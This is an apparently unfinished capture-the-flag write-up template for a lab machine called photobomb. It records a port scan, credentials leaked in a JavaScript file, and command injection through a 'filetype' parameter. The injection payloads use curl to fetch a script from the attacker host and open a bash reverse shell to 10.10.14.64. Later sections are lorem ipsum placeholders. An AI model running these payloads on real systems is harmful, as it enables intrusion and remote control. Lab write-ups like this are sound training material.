---
#Date: {{date}}
public: false # set to true to make the article publishable
#notbefore: YYYY-MM-DD  # if hide == true and notbefore is set, will not publish until the given date
Platform: 
Category:
Difficulty:
Tags:
Status:
---




# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```


---

# Enumeration
## Port 80 - HTTP (Apache)
Le fichier `/photobomb.js`  contient des identifiants de connexion :
```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
```

---

# Exploitation
## Command injection
HTTP Post parameter `filetype` is vulnerable to command injection
Reverse shell creation
```bash
# shell.sh content :
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.64/1337 0>&1'
```
Payload 1 : download *shell.sh*
```
photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;curl http://10.10.14.64:80/shell.sh -O &dimensions=10x10
```
Payload 2 : execute it
```
photo=eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg&filetype=jpg;bash ./shell.sh -O &dimensions=10x10
```


---

# Privilege escalation to root
## Permissive environment variable

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Trophy & Loot
user.txt

root.txt